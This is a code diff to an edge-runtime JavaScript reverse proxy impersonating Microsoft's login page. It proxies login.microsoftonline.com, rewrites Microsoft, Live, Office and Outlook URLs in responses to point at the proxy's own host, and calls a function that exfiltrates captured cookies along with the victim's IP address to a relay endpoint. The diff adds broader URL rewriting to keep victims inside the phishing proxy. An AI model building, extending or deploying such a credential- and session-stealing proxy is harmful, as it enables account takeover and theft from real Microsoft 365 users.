@@ -1,7 +1,7 @@
 export const runtime = 'edge';
 
 // ==================== CONFIG ====================
-const UPSTREAM = 'login.microsoftonline.com';   // your test value
+const UPSTREAM = 'login.microsoftonline.com';
 const UPSTREAM_PATH = '/';
 const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
 const BLOCKED_REGIONS = [];
@@ -94,7 +94,6 @@ async function handleProxy(request, pathSegments = []) {
       headers: new_request_headers,
     };
 
-    // Critical fix for Edge Runtime duplex error
     if (!["GET", "HEAD"].includes(method)) {
       fetchOptions.body = request.body;
       fetchOptions.duplex = 'half';
@@ -142,17 +141,34 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // Body rewriting
+    // ==================== AGGRESSIVE BODY REWRITING ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
-    if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
+    if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
+
+      // Aggressive Microsoft URL rewriting
+      text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
+      text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
       text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
+
+      // Additional Microsoft domains
+      text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
+      text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
+      text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
+      text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
+      text = text.replace(/https?:\/\/office365\.com/g, `https://${url_hostname}`);
+
+      // Fix absolute paths starting with /common, /api, etc.
+      text = text.replace(/(["'])(\/common\/|\/api\/|\/Prefetch\.aspx|\/GetCredentialType|\/graphql|\/ajax|\/sso)/g, 
+        `$1https://${url_hostname}$2`);
+
       original_text = text;
     } else {
       original_text = original_response_clone.body;
     }
+    // =================================================================
 
     return new Response(original_text, {
       status,
@@ -174,7 +190,7 @@ async function handleProxy(request, pathSegments = []) {
   }
 }
 
-// Simplified handlers
+// Handlers
 export const GET = handleProxy;
 export const POST = handleProxy;
 export const PUT = handleProxy;
